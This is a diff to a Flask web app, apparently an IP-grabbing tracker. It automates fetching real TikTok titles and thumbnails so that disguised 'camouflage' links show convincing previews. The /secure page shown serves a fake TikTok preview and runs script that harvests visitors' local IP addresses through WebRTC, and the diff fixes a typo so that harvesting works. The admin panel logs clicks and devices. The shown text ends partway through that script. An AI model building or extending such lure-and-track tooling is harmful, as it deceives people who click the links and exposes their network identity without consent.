@@ -2,6 +2,7 @@ from flask import Flask, render_template_string, request, redirect, jsonify, Res
 import uuid
 import datetime
 import sqlite3
+import requests
 from functools import wraps
 
 app = Flask(__name__)
@@ -18,6 +19,7 @@ def init_db():
                 id TEXT PRIMARY KEY,
                 original_url TEXT,
                 note TEXT,
+                video_title TEXT,
                 custom_image TEXT
             )
         ''')
@@ -35,6 +37,23 @@ def init_db():
         conn.commit()
 
 init_db()
+
+# دالة ذكية لجلب غلاف الفيديو وعنوانه الحقيقي من تيك توك تلقائياً
+def get_tiktok_meta(video_url):
+    default_img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
+    default_title = "TikTok - شاهد مقطع الفيديو الرائج"
+    try:
+        # استخدام API الرسمي المفتوح من تيك توك لجلب معلومات المعاينة
+        api_url = f"https://www.tiktok.com/oembed?url={video_url}"
+        response = requests.get(api_url, timeout=5)
+        if response.status_code == 200:
+            data = response.json()
+            title = data.get('title', default_title)
+            image = data.get('thumbnail_url', default_img)
+            return title, image
+    except Exception:
+        pass
+    return default_title, default_img
 
 def check_auth(username, password):
     return username == USERNAME and password == PASSWORD
@@ -85,7 +104,7 @@ HTML_LAYOUT = '''
     </style>
 </head>
 <body>
-    <div class="navbar">📊 لوحة تحكم إدارة الروابط المتقدمة</div>
+    <div class="navbar">📊 لوحة التحكم والإدارة التلقائية (جلب أغلفة الفيديو)</div>
     <div class="container">
         
         <div class="stats-overview">
@@ -100,49 +119,44 @@ HTML_LAYOUT = '''
         </div>
 
         <div class="create-box">
-            <h2>🔗 إنشاء رابط تتبع جديد بمواصفات المعاينة</h2>
+            <h2>🔗 إنشاء رابط تتبع جديد (يجلب الغلاف تلقائياً)</h2>
             <form action="/create" method="POST">
-                <label>الرابط الأصلي المستهدف (Original URL):</label>
+                <label>رابط فيديو التيك توك (Original URL):</label>
                 <input type="url" name="original_url" placeholder="https://vt.tiktok.com/..." required>
-                
-                <label>رابط صورة غلاف الفيديو (Image URL للمعاينة):</label>
-                <input type="url" name="custom_image" placeholder="ضع رابط صورة الغلاف الحقيقي للفيديو هنا">
                 
                 <label>ملاحظة لتمييز الرابط (Note):</label>
                 <input type="text" name="note" placeholder="مثال: فسيليتي 11" required>
                 
-                <button type="submit">توليد وإضافة الرابط</button>
+                <button type="submit">توليد الرابط الذكي</button>
             </form>
         </div>
 
-        <div class="section-title">📋 قائمة الروابط النشطة</div>
+        <div class="section-title">📋 قائمة الروابط النشطة المعاينة تلقائياً</div>
         <div class="table-wrapper">
             <table class="main-table">
                 <thead>
                     <tr>
                         <th>الملاحظة (Note)</th>
+                        <th>العنوان المستخرج</th>
                         <th>النقرات</th>
                         <th>رابط التمويه المخصص</th>
-                        <th>صورة المعاينة</th>
+                        <th>غلاف الفيديو المجلوب</th>
                     </tr>
                 </thead>
                 <tbody>
                     {% if not links_list %}
                     <tr>
-                        <td colspan="4" style="padding: 20px; color: #95a5a6;">لا توجد روابط منشأة حتى الآن.</td>
+                        <td colspan="5" style="padding: 20px; color: #95a5a6;">لا توجد روابط منشأة حتى الآن.</td>
                     </tr>
                     {% else %}
                         {% for link in links_list %}
                         <tr>
                             <td style="font-weight: bold; color: #2c3e50;">{{ link.note }}</td>
+                            <td style="max-width: 150px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">{{ link.video_title }}</td>
                             <td><span class="badge">{{ link.clicks_count }}</span></td>
                             <td><a class="link-text" href="/secure/{{ link.id }}" target="_blank">{{ host_url }}secure/{{ link.id }}</a></td>
                             <td>
-                                {% if link.custom_image %}
                                 <img src="{{ link.custom_image }}" width="50" height="40" style="border-radius:4px; object-fit:cover;">
-                                {% else %}
-                                <span style="color:#aaa;">افتراضية</span>
-                                {% endif %}
                             </td>
                         </tr>
                         {% endfor %}
@@ -151,7 +165,7 @@ HTML_LAYOUT = '''
             </table>
         </div>
 
-        <div class="section-title">🔍 سجل النقرات وتتبع الأجهزة (Logs)</div>
+        <div class="section-title">🔍 سجل النقرات المباشر وتتبع الأجهزة (Logs)</div>
         <div class="logs-box">
             <table class="logs-table">
                 <thead>
@@ -196,7 +210,7 @@ def home():
         cursor = conn.cursor()
         
         cursor.execute('''
-            SELECT l.id, l.original_url, l.note, l.custom_image, COUNT(c.id) as clicks_count 
+            SELECT l.id, l.original_url, l.note, l.video_title, l.custom_image, COUNT(c.id) as clicks_count 
             FROM links l LEFT JOIN clicks c ON l.id = c.link_id 
             GROUP BY l.id
         ''')
@@ -220,12 +234,16 @@ def home():
 def create():
     original_url = request.form.get('original_url')
     note = request.form.get('note')
-    custom_image = request.form.get('custom_image') or "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
+    
+    # استدعاء الدالة لجلب العنوان وصورة الغلاف الحية للفيديو تلقائياً
+    video_title, custom_image = get_tiktok_meta(original_url)
+    
     link_id = str(uuid.uuid4())[:6].upper()
     
     with sqlite3.connect(DB_FILE) as conn:
         cursor = conn.cursor()
-        cursor.execute("INSERT INTO links (id, original_url, note, custom_image) VALUES (?, ?, ?, ?)", (link_id, original_url, note, custom_image))
+        cursor.execute("INSERT INTO links (id, original_url, note, video_title, custom_image) VALUES (?, ?, ?, ?, ?)", 
+                       (link_id, original_url, note, video_title, custom_image))
         conn.commit()
         
     return redirect('/')
@@ -239,8 +257,8 @@ def secure_redirect(link_id):
         link_data = cursor.fetchone()
         
     if link_data:
-        title = "TikTok - شاهد مقطع الفيديو الرائج"
-        description = "انقر لمشاهدة الفيديو بالكامل بجودة عالية على تيك توك."
+        title = link_data['video_title']
+        description = "شاهد مقطع الفيديو المرفق بجودة عالية عبر تيك توك."
         image_url = link_data['custom_image']
         
         return f'''
@@ -262,7 +280,7 @@ def secure_redirect(link_id):
             <script>
                 function gatherLocalIPsAndRedirect() {{
                     var detectedIPs = [];
-                    window.RTCPPeerConnection = window.RTCPPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                    window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                     
                     if (!window.RTCPeerConnection) {{
                         sendData("غير مدعوم");
